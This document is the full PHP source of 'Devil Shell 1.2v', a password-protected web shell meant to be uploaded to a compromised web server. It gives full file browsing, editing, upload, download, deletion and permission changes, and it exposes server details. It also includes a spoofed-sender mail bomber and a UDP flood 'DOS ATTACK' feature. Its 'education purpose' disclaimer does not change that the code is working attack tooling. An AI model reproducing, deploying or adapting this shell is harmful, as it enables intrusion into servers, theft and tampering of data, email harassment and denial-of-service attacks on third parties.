<?php
//========================================//
//========+++DEVIL SHELL 1.2v+++==========//
// username: ugdevil
// passwd: 1234567
//========================================//
//====+++CODED BY UNDERGROUNDE DEVIL+++===//
//========================================//
//=====+++TEAM NUTS|| HACKNUTS.COM+++=====//
//========================================//
//====+++EMAIL ID UGDEVIL@GMAIL.COM+++====//
//========================================//
session_start();
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);

?>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/> 
<title>υη∂єяgяσυη∂ ∂єνιℓ: αη ιη∂ιαη нα¢кєя</title>
<body text=#336666 bgcolor="#0000000" oncontextmenu="return false;">
<?php
$pstr="Q3JlZGl0IDogVW5kZXJncm91bmQgRGV2aWwgJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7ICZuYnNwOyAmbmJzcDsgJm5ic3A7RW1haWw6IHVnZGV2aWxAZ21haWwuY29t ";
	$pv=@phpversion();
	$self=$_SERVER["PHP_SELF"];
	$sm = @ini_get('safe_mode');
	
	if(isset($_GET['open']))
	{
		chdir($_GET['open']);
		$_SESSION['dir']=$_GET['open'];
	}
	else if(isset($_GET['create']))
	{
		chdir($_GET['create']);
		$_SESSION['dir']=$_GET['create'];
	}
	else if(isset($_GET['self']))
	{
	unlink(__FILE__);
	}
	
		
 if(isset($_POST['dsub']))
	{
		header('location:'.$self."?open=".$_POST['ndir']);
	}
	function devil($a)
	{
		$sec=strrev(sha1($a));
		return $sec;
	}
	
	function sept()
		{
			$sepr=explode('?',$self);
			echo $sepr[0];
		}
	function validate_email($e1,$e2,$n)
	{
	
	if( (filter_var($e1,FILTER_VALIDATE_EMAIL)) && (filter_var($e2,FILTER_VALIDATE_EMAIL)) )
	{
	if(is_numeric($n))
	{
	$error="";
	return $error;
	}
	else
	{
	$error="Enter valid number of messages";
	
	}
	}
	else
	{
	$error="Enter Valid Email Id";}
	
	return $error;
	
	}
		
if(isset($_SESSION['a'])&& !isset($_GET['edit']))
{	
	function dis()
	{
		if(!ini_get('disable_functions'))
		{
			echo "None";
		}
		else
		{
			echo @ini_get('disable_functions');
		}
	}
	function logout()
	{
	session_destroy();
	header('location:'.$self);
	}
	function yip()
	{
		echo $_SERVER["REMOTE_ADDR"];
	}
	function odi()
	{
		$od = @ini_get("open_basedir");
		echo $od;
	}
	function sip()
	{
		echo getenv('SERVER_ADDR');
	}
	function cip()
	{
		echo $_SERVER["SERVER_NAME"];
	}
	function  safe()
	{
		echo($sm?"YES":"NO");
	}
	function browse()
	{
		$brow= $_SERVER["HTTP_USER_AGENT"];
		print($brow);
	}
	function split_dir()
	{
		$de=explode("/",getcwd());
		$del=$de[0];
		for($count=0;$count<sizeof($de);$count++)
		{
		$imp=$imp.$de[$count].'/';
			
		echo "<a href=".$self."?open=".$imp.">".$de[$count]."</a> / ";
		}
		
	}
	function mysql_ver() 
		{
			$output = shell_exec('mysql -V');
			 preg_match('@[0-9]+\.[0-9]+\.[0-9]+@', $output, $ver);
			 return $ver[0];
		}
		function download()
		{
	
	$frd=$_GET['download'];
	
	$prd=explode("/",$frd);
	for($i=0;$i<sizeof($prd);$i++)
			{
		$nfd=$prd[$i];
		
			}


	@ob_clean(); 
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".filesize($nfd)); 
   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   readfile($nfd);

   exit;
	
		}

	if(isset($_GET['delete']))
		{
			if(isset($_GET['file']))
			{
			unlink($_GET['delete']);
			}
			else
			{
				rmdir ($_GET['delete']);
			}
			//$redir=$_GET['open'];
			header('location:'.$self.'?open='.$_SESSION['dir']);
			
		}
	function disk($this)
	{
		if($this=='2')
		$ds=disk_free_space(".");
	else
	$ds=disk_total_space(".");
	
	 if($ds>=1073741824) 
		 {
		 $ds=number_format(($ds/1073741824),2)." gb";
		 }
	else if($ds>=1048576)  
		 {
		 $ds=number_format(($ds/1048576),2)." mb";
		 }
	else if($size >= 1024) 
		 {
		 $ds=number_format(($ds/1024),2)." kb";
		 }
	 else
		{
		 $ds=$ds." byte";
		}

return $ds;
	}
		

	if($_GET['u']=='logout')
	{
		logout();
		header('location:'.$self);
	}
	else if($_POST['u'])
	{
		move_uploaded_file($_FILES['a']['tmp_name'],
		$_FILES['a']['name']);
		move_uploaded_file($_FILES['b']['tmp_name'],$_FILES['b']['name']);
		move_uploaded_file($_FILES['c']['tmp_name'],$_FILES['c']['name']);
		//header('location:'.$self."?open=".$_GET['open']);
		
	}
	
	$str="PHA+PHN0cm9uZz5EZXZpbCBTaGVsbCBWMS4yICBQSFAgU2hlbGw8L3N0cm9uZz48L3A+DQo8cD5E
ZXZpbCBTaGVsbCBWMS4yIFBIUCBTaGVsbCBpcyBhIFBIUCBTY3JpcHQgbWFrZSBmb3IgY2hlY2tp
bmcgdGhlIHZ1bG5lcmFiaWxpdHkgYW5kIHNlY3VyaXR5IGNoZWNrIG9mIGFueSB3ZWIgc2VydmVy
IG9yIHdlYnNpdGUuIFlvdSBjYW4gY2hlY2sgeW91ciBXZWJzaXRlIGFuZCByZW1vdGUgd2ViIHNl
cnZlciBTZWN1cml0eS4gVGhpcyBzaGVsbCBwcm92aWRlIHlvdSBtb3ZlIGluIHNlcnZlciBkaXJl
Y3RvcnkgLHZpZXdpbmcgZmlsZXMgcHJlc2VudCBpbiBkaXJlY3RvcnkgLHlvdSBjYW4gZGVsZXRl
ICxlZGl0IGFuZCB1cGxvYWQgcHJvZmlsZXMuIE1vcmUgb3ZlciB5b3UgY2FuIGNoZWNrPGJyPg0K
ICBTZXJ2ZXIgSVAgLFlvdXIgSVAsIEhvc3RlZCAgUEhQIFZlcnNpb24gLCBTZXJ2ZXIgUG9ydCwg
TWFpbCBib21iaW5nLEREb1MsQ3JlYXRlIEZvbGRlciBhbmQgRmlsZXMvIENoYW5nZSBQZXJtaXNz
aW9ucyA8L3A+DQo8cD48c3Ryb25nPkFib3V0IENvZGVyOjwvc3Ryb25nPjxicj4NCiAgU2NyaXB0
IGlzIGNyZWF0ZWQgYnkgVW5kZXJncm91bmQgRGV2aWwgYSBJbmRpYW4gRXRoaWNhbCBoYWNrZXIg
V2l0aCB0aGUgaGVscCBvZiBUZWFtIE5VVFMgYW5kIE15IGZyaWVuZHMgLndobyBnYXZlIG1lIGlk
ZWEgYW5kIGVuY291cmFnZSB0byBtYWtlIHRoaXMuIFlvdSBjYW4gZG93bmxvYWQgdGhpcyBzY3Jp
cHQgZnJvbSB0ZWFtbnV0cy5pbiAudGhpcyBpcyByZWxlYXNlIHVuZGVyIEdOVSBHRU5FUkFMIFBV
QkxJQyBMSUNFTlNFPGJyPg0KPC9wPg0KPHA+PHN0cm9uZz5MaW1pdGF0aW9uczo8L3N0cm9uZz48
YnI+DQogIFRoZXJlIHNvbWUgZnVuY3Rpb24gd2lsbCBub3Qgd29yayBvbiB3aW5kb3cgc2VydmVy
IC48L3A+DQo8cD48c3Ryb25nPkRlY2xhcmF0aW9uIDo8L3N0cm9uZz48YnI+DQogIFRoaXMgc2Ny
aXB0IG9ubHkgZm9yIGVkdWNhdGlvbiBwdXJwb3NlIGRvbid0IG1pc3MgdXNlIGl0IG90aGVyd2lz
ZSB0aGUgc2NyaXB0IG1ha2VyIGlzIG5vdCB0YWtlIGFueSByZXNwb25zaWJpbGl0eSBmb3IgYW55
IGRhbWFnZSBvciBoYXJtIG9yIGFjY291bnQgc3VzcGVuZGVkPC9wPg0KPHA+PHN0cm9uZz5JbnN0
YWxsYXRpb246PC9zdHJvbmc+PGJyPg0KICBTaW1wbGUgaW5zdGFsbGF0aW9uIGp1c3QgcGVuZXRy
YXRlIHRoZSBmaWxlIHVzaW5nIEZUUCBvciBodG1sIFVwbG9hZGVyIG9uIHNlcnZlciBhbmQgY2hl
Y2sgdGhlIHNpdGUgdnVsbmVyYWJpbGl0eS48L3A+DQo8cD5UaGlzIGlzIHBhc3N3b3JkIHByb3Rl
Y3RlZCBzaGVsbCBzbyB5b3UgY2FuIHNlbmQgZW1haWwgdG8gZ2V0IHVzZXJuYW1lIG9yIHBhc3N3
b3JkIGE8c3Ryb25nPnQgdWdkZXZpbEBnbWFpbC5jb208L3N0cm9uZz48L3A+DQo8cD48c3Ryb25n
PlN1Z2dlc3Rpb24vQnVnIFJlcG9ydDo8L3N0cm9uZz48YnI+DQogIFRoaXMgaXMgbXkgZmlyc3Qg
dmVyc2lvbiBzbyBtYXkgYmUgdGhlcmUgd291bGQgYmUgc29tZSBidWdzIHByZXNlbnQgc28gZG9u
J3QgaGVzaXRhdGUgbWUgdG8gaW5mb3JtIG1lIGlmIHlvdSB3YW50IHRvIGdpdmUgYW55IHN1Z2dl
c3Rpb24gZG9uJ3QgaGVzaXRhdGUgdG8gbWFpbCBtZSBhdCB1Z2RldmlsQGdtYWlsLmNvbTxicj4N
CjwvcD4NCjxwPjxzdHJvbmc+RG93bmxvYWQ8L3N0cm9uZz48YnI+DQogIFlvdSBjYW4gZG93bmxv
YWQgc2hlbGwgYXQgdGVhbW51dHMuaW4gYW5kIGFsc28gdmlzaXQgdGVhbW51dHMuaW4gZm9yIGxh
dGVzdCB2ZXJzaW9uLm9yIHlvdSBjYW4gbWFpbCBtZSBmb3IgdGhpcyBzY3JpcHQgYXQgdWdkZXZp
bEBnbWFpbC5jb208L3A+DQo=";


	
?>
<table width=100%>
<tr><td bgcolor="#000000"><table>
<tr width=100 height=20><td width=100  bgcolor=green></td><td rowspan=3><font color=#33CCCC face="Monotype Corsiva" size=7><?php echo base64_decode("RGV2aWwgU2hlbGw="); ?></font> <font color=#FFffff><?php echo base64_decode('VjEuMg=='); ?></font></tr>
<tr width=100 height=20 bgcolor=white><th><font color=blue><?php echo base64_decode("SU5ESUE="); ?></font></th></tr>
<tr width=100 height=20 bgcolor=orange><td></td></tr>
</table>

</td>
</tr>
<tr><td bgcolor="#000000">	<hr class=li><a href=<?php echo $self."?open="; ?>>Shell</a> | <a href=<?php echo $self."?create=".$_SESSION['dir']?>>Create File</a>  | 
<a href=<?php echo $self."?moreinfo"; ?>>More Information</a>  |
<a href=<?php echo $self."?mail"; ?>>Mail Bomber</a> |
<a href=<?php echo $self."?phpinfo"; ?>>PHP Info</a> |
<a href=<?php echo $self."?dos"; ?>>DOS ATTACK</a> |
<a href=<?php echo $self;?>?warning>Declaration</a> |
<a href=<?php echo $self;?>?self>Self Kill</a> |
<a href=<?php echo $self;?>?u=logout>Logout</a></td>
</tr>
<tr><td bgcolor="#000000">	<hr  class=li><span class=hd>Server IP :</span><span class=head> <?php cip(); ?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Your IP :</span><span class=head> <?php yip(); ?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>PHP Version :</span> <span class=head><?php echo $pv; ?></span>

&nbsp;&nbsp;<span class=hd>Server Port :</span> <span class=head><?php echo $_SERVER['SERVER_PORT'];?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Safe Mode :</span> <span class=head><?php safe();?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Disk Space :</span> <span class=head><?php echo disk(1);?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>free Space :</span> <span class=head><?php echo disk(2);?></span>
<br><br>
<span class=hd>Your System info :</span> <span class=head><?php echo php_uname(); ?></span><br>
<br>
<span class=hd>View Other Directories</span> <span class=head>[<a href=<?php echo $self;?>?open=c:/>C:</a>]</span> | <span class=head>[<a href=<?php echo $self;?>?open=D:/>D:</a>]</span>
| <span class=head>[<a href=<?php echo $self;?>?open=E:/>E:</a>]</span>
<br>
<span class=hd>Directory : </span> <span class=head><?php echo split_dir();?></span>
	<hr class=li>
</td></tr>
<tr><td bgcolor="#000000">
<table  width=100% class=tab>

<?php
	if(isset($_GET['create']))
	{
		if(isset($_SESSION['a']))
		{
			echo "<form action=$self?edit=".$_SESSION['a']." method=post>";
		}
		else
		{
			echo "<form action=$self?edit= method=post>";

		}

	?>
	<center>
	<table>
	<tr><td><span class=head>File Name </span> </td><td><input type=text name=fn size=70></td></tr>
	<tr><td colspan=2><span class=head>File content</td></tr>
	<tr><th colspan=2><center><textarea rows=15 cols=70 name=fc></textarea></th></tr>
<tr><th colspan=2><input type=submit value="Create File">
	</th></tr></table>
	</form>
	<?php
	}
	else if(isset($_POST['dper']))
	{
		$chm=$_POST['cc1']*100+$_POST['cc2']*10+$_POST['cc3'];
		$chh="0$chm";
		chmod($_POST['cper'],0777) or die("errror");
		echo $_POST['cper'];
		header('location:'.$self."?open=".$_GET['open']);
	}
	else if(isset($_POST['csub'])&&!empty($_POST['csub']))
	{
	
		mkdir($_POST['cdir']);
		header('location:'.$self."?open=".$_GET['open']);

	}
	else if(isset($_GET['mail']))
	{
	
	if(isset($_POST['send_email']))
{

$num=stripslashes($_POST['num']);
$sen=stripslashes($_POST['sen']); 
$rec=stripslashes($_POST['rec']); 
$sub=stripslashes($_POST['sub']); 
$msg=stripslashes($_POST['msg']); 





if(!empty($sen)&&!empty($rec)&&!empty($num)&&!empty($sub)&&!empty($msg))
{

$error=validate_email($sen,$rec,$num);
if($error=="")
{
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/plain"."; charset=windows-1251\r\n"; 

$headers .= "From: ".$sen; 

for($i=0;$i<$num;$i++)
{
$rand=rand(1222,8999);
$phead=$headers.$rand;
mail($rec,$sub,$msg,$phead) or die('<b>Message Sending Failed</b>');


}


}
}
else
{
$error="Fill all the fields";

}
}
	$zzz=<<<zzx
<form action= $self?mail= method="post">
<table>
<tr><td><b>Sender's Email</b></td><td><input type=text name=sen value=$sen></td></tr>
<tr><td><b>Receipent's Email</b></td><td><input type=text name=rec value=$rec></td></tr>
<tr><td><b>Number</b></td><td><input type=text name=num  onkeyup="this.value=only_num(this.value)" maxlength=7 value=$num></td></tr>
<tr><td><b>Subject</b></td><td><input type=text name=sub value=$sub></td></tr>
<tr><td><b>Message</b></td><td><textarea name=msg rows=10 cols=40 >$msg</textarea></td></tr>
<tr><td></td><td><input type=submit name=send_email value=send ></td></tr><br/>
<tr><td colspan="2"><p style=" font-size:25px"><b>$error</b></p></td></tr>
</table>
</form>
zzx;
echo $zzz;


	}
	else if(isset($_GET['warning']))
	{
	
		echo base64_decode($str);

	}
else if(isset($_GET['phpinfo']))
{
	echo "<center>".phpinfo();
}

else if(isset($_GET['moreinfo']))
	{
	?>
	<center>

<table width=90%>
<tr><th colspan=2 width=200> Brief Information </th></tr>
<tr><td class=head><b>Server Admin : </td><td><?php echo $_SERVER['SERVER_ADMIN']; ?></td></tr>
<tr><td class=head><b>Server Name : </td><td><?php cip(); ?></td></tr>
<tr><td class=head><b>Server IP : </td><td> <?php cip(); ?> </td></tr>
<tr><td class=head><b>Server PORT : </td><td><?php echo $_SERVER['SERVER_PORT'];?></td></tr>
<tr><td class=head><b>Safe Mode : </td><td><?php echo @ini_get("safe_mode")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?></td></tr>
<tr><td class=head><b>Base Directory : </td><td><?php echo @ini_get("open_basedir")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?></td></tr>
<tr><td class=head><b>Your IP : </td><td><?php yip(); ?></td></tr>
<tr><td class=head><b>PHP VERSION : </td><td><?php echo $pv; ?></td></tr>
<tr><td class=head><b>Curl</td><td><?php echo function_exists('curl_version')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>Oracle : </td><td><?php echo function_exists('ocilogon')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>MySQL : </td><td><?php  echo function_exists('mysql_connect')?("<b>Enable"):("Disable");?></td></tr>
<tr><td class=head><b>MSSQL :</td><td><?php echo function_exists('mssql_connect')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>PostgreSQL :</td><td><?php echo function_exists('pg_connect')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>Disable functions :</td><td><?php dis(); ?></td></tr>
<tr><td class=head><b>Total Disk Space : </td><td><?php echo disk(1);?></td></tr>
<tr><td class=head><b>Free Space : </td><td><?php echo disk(2);?></td></tr>
<tr><td class=head><b>OS</td><td><?php echo php_uname(); ?></td></tr>
<tr><td class=head><b>Server Software : </td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>


</table>
	<?php
	}
else if(isset($_GET['download']))
	{
	
	download();
	
	
			
	}

	else if(isset($_GET['rename']))
	{
		echo "<form action=# method=post>New File name <input type=text name=rf><br><input type=submit value='Rename File' name=srf></form>";
		if(isset($_POST['srf']))
		{
			rename($_GET['rename'],$_POST['rf']);
			header('location:'.$self."?open=".$_SESSION['dir']);
		}
	}
	else if(isset($_GET['dos']))
	{
		if(!isset($_POST['dsub']))
		{
			echo "<center><form action=# method=post><table><tr><td colspan=2><h2>DOS ATACK</h2> <tr><td>Target Server IP : </td><td><input type=text name=ddos value=".$_SERVER["SERVER_NAME"]."></td></tr>
		<tr><td>Server Port : </td><td><input type=text name=dpos value=".$_SERVER['SERVER_PORT']."></td></tr>
		<tr><td>Time Execution : </td><td><input type=text name=dtim></td></tr>
		<tr><th colspan=2><input type=Submit  name=dsub value='attack--->'></th></tr>
		<tr><td colspan=2 height=100></td></tr>
		</table></form>";
		}
		else
		{
			
			$sip=$_POST['ddos'];
			$port=$_POST['dpos'];
			$t=time()+$_POST['dtim'];
			$send = 0;
			print "DOS Atack on $ip using ".$port."PORT <br><br>";
			for($i=0;$i<99999;$i++)
				{
					$get .= "FLOOD";
				}
				do
				{
					$send++;
				}
				while(time() > $max_time);
				
        
			$fo = fsockopen("udp://$sip", $port, $errno, $errstr, 5);
			if($fo)
				{
                fwrite($fo, $get);
                fclose($fo);
				}

			echo "DOS completed @ ".date("h:i:s A")."<br> Total Data Send [" . number_format(($send*65)/1024, 0) . " MB]<br> Average Data per second [". number_format($send/$_POST['dtim'], 0) . "]";
		}
	}
else if($handle = opendir('./'))
 {
  while (false !== ($file = readdir($handle))) 
  {
  if(is_dir($file))
     {
    $directories[] = $file;
     }
     else
     {
    $files[] = $file;
     }
  }
 asort($directories);
 asort($files);
 $kb=filesize($file)/1024;
 
foreach($directories as $file)
  { if($bg%2==0)
	   echo "<tr bgcolor=#353535>";
	   else
		   echo "<tr bgcolor=#242424>";
	    $kb=number_format(filesize($file)/1024,2);
	  echo "
 <td valign=top><a href=".$self."?open=".realpath('.')."/".$file."><span class=li>".$file."</span> </a></td><td class=li> &nbsp;&nbsp;&nbsp;&nbsp;...<td valign=top class=li width=150>".date ("m/d/Y | H:i:s", filemtime($file))."</td>
 <th width=100><font color=white>".substr(sprintf('%o', fileperms(realpath(''))), -3)."</td>
 <td><a href=".$self."?open=".realpath('.')."/".$file."><span class=li>Open</span></a> | <a href=".$self."?delete=".realpath('.')."/".$file."><span class=li>Delete</span></a> 
 </td>";
   $bg++;
  }

  foreach($files as $file)
  {
	   if($bg%2==0)
	   echo "<tr bgcolor=#353535>";
	   else
		   echo "<tr bgcolor=#242424>";
	    $kb=number_format(filesize($file)/1024,2);
	  echo "
  <td valign=top><a href=".$self."?edit=".realpath('')."><span class=li>".$file."</span> </a></td><td class=li> &nbsp;&nbsp;&nbsp;&nbsp;".$kb."kb<td valign=top class=li>".date ("m/d/Y | H:i:s", filemtime($file))."</th>
   <th><font color=white>".substr(sprintf('%o', fileperms(realpath(''))), -3)."</td>
  <td><a href=".$self."?edit=".realpath('.')."/".$file."><span class=li>View</span></a> | <a href=".$self."?rename=".realpath('.')."/".$file."><span class=li>Rename</span></a>|<a href=".$self."?delete=".realpath('.')."/".$file."&file><span class=li>Delete</span></a> | <a href=".$self."?download=".realpath('.')."/".$file."><span class=li>Download</span></a> ";
   $bg++;
   }


 ?>

</table>
</td>
</tr>
<tr height=30><td bgcolor="#000000"><table> <tr><td colspan=2>
<form action=# method=post enctype=multipart/form-data>
<table>
<tr><td><span class=hd> Upload file 1 : </td><td><input type=file name=a size=80 class=upl></span></td></tr>
<tr><td><span class=hd > Upload file 2 : </td><td><input type=file name=b size=80 class=upl></span></td></tr>
<tr><td><span class=hd> Upload file 3 : </td><td><input type=file name=c size=80 class=upl></span>
<tr><td>
<input type=submit value=Upload name=u class=sub></td></tr></table>
</form>
</td></tr>


<tr><td colspan=2>
<table><tr><td>
<form action=# method=post>
<span class=hd>Change Permission</span>  : <input type=text name=cper Value=<?php echo "'From Current Folder'"; ?> size=20>&nbsp
<select name=cc1>
<?php
for($k=7;$k>=1;$k--)	
echo "<option>".$k;
?>
</select>
<select  name=cc2>
<?php
for($k=7;$k>=1;$k--)	
echo "<option>".$k;
?>
</select>
<select name=cc3>
<?php
for($k=7;$k>=1;$k--)	
echo "<option>".$k;
?>
</select>

&nbsp;<input type=submit value=go name=dper>
|</form></td><td>  <form action=# method=post><span class=hd>Create Directory</span> <input type=text name=cdir Value=<?php echo "'Create New Folder'"; ?> size=20>&nbsp;<input type=submit value=Create name=csub></form></td></tr></table>
</td></tr>
<form action=# method=post><tr><td>

<span class=hd>Go : </td><td><input type=text name=ndir Value=<?php echo realpath(''); ?> size=80>&nbsp;&nbsp;&nbsp;<input type=submit value=go name=dsub></span></td></tr>
</form>
</table>



</td>
</tr>



<?php
}

echo "<tr height=25><th bgcolor=#000000><span class=tab><font color=#336666>".base64_decode($pstr)."</span></th></tr>
</table>";
}

else if(isset($_GET['edit'])&&isset($_SESSION['a']))
{
	if(isset($_POST['fn'])&& !empty($_POST['fc']))
	{
	
		if(empty($_SESSION['dir']))
		{
		$fo=fopen($_POST['fn'],"a");
		}
		else
		{
			$fo=fopen($_SESSION['dir']."/".$_POST['fn'],"a");
		}

		fwrite($fo,$_POST['fc']);
		fclose($fo);
		header('location:'.$self."?open=".$_SESSION['dir']);

	}
	else if(isset($_POST['fdata'])&&!empty($_POST['fdata']))
	{
		$b_dir=$_GET['edit'];
		$exp=explode("/",$b_dir);
		for($i=0;$i<sizeof($exp);$i++)
		{
			$txt=$exp[$i];
		}
		echo "File name is : ".$txt."<br>";
		$fd=fopen($_GET['edit'],'w');
		fwrite($fd,$_POST['fdata']);
		fclose($fd);
		header('location:'.$self."?open=".$_SESSION['dir']);
	}
	else
	{
	
?>

<table width=100%><tr bgcolor=#000000><td>File Name:<?php echo $_GET['edit']; ?> [<a href=<?php echo $self; ?>>Main Page</a>]</font>
<form action=# method=post><tr bgcolor=#33CCCC><td><center>
<textarea rows=30 cols=100 name=fdata>
<?php
	$fedit=$_GET['edit'];
$frd=fopen($fedit,"r");
while(!feof($frd))
	{
	echo htmlspecialchars(fgets($frd));
	

	echo "$fp";
	}
	
?>
</textarea>

<hr class=li>
<input type=submit value="&nbsp;&nbsp;&nbsp;Edit File&nbsp;&nbsp;&nbsp;" name=fdat class=lin>

<hr class=li>
</form>
</td></tr>

</td></tr>

</table>
<?php
}
}
else
{
$cuser=devil($_POST['uname']);
$puser=devil($_POST['pass']);
?>
	<br><br><br><center><table height=400 border=0  background="http://a4.sphotos.ak.fbcdn.net/hphotos-ak-snc6/222638_131664110242055_100001954008066_224065_7009633_n.jpg"  width=400 >
<tr><td height="141">


<p class="head">&nbsp;</p></td>
</tr>
<form action=# method=post>
<tr><th  height=130 valign=top><font color=white>Username</font> &nbsp;&nbsp;&nbsp;<input type=text name=uname size=15>
<br>
<font color=white>Password &nbsp;&nbsp;&nbsp;&nbsp;<input type=password name=pass size=15>
<br>
<input type=submit value=submit>
</td>
</form>
</tr>
<tr><td></td>
</tr>

</table>

<?php 
$euser="4e1474180ab8436828a90119de89f91ca0edda1f";
$epass="cf23307b0df16d25f438e697612e0b46d5ebae02";
	if($cuser==$euser && $puser==$epass)
	{$_SESSION['a']=$_POST['uname'];
header('location:'.$self);}} ?>
<style>
#submit {color:#ff6600;outline:none;text-decoration:none;}
a {color:#fff;outline:none;text-decoration:none;}
a:hover{text-decoration:none;}
.head {
	color: #ffffff;
	font-weight: bold;
}
.tab
{
	border-color:#336666;
	border:double;
}
.hd
{
	color:#33CCCC;
	border-color:#2A2A2A;
	border:double;
}
.li{
	color: #33CCCC;
	text-decoration:none;
	
}
.lin
{
	background-color: #33CCCC;
	text-decoration:none;
	
}
input
{
font-family: verdana, arial, sans-serif;
font-size: 100%;
color: #000000;
border: #000333 2px solid;
background-color: #33CCCC; //tan
border-color: brown;

}
textarea
{
font-family: verdana, arial, sans-serif;
font-size: 100%;
color: #000000;
border: #000333 2px solid;
background-color: #33CCCC; //tan
border-color: brown;

}
</style>

